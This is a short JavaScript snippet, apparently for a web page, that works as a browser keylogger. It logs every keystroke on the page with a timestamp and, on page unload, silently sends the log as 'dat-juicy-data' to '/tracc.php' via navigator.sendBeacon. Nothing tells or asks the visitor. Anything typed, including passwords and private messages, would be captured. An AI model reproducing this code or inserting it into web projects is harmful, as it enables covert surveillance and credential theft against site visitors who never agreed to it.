const data = [];

document.body.onkeydown = event => {
    data.push({
        k: event.key,
        t: + new Date,
    });
};

const tracc = () => {
    const formData = new FormData;
    formData.set('dat-juicy-data', JSON.stringify(data));
    navigator.sendBeacon("/tracc.php", formData);
}

window.addEventListener('unload', tracc, false);
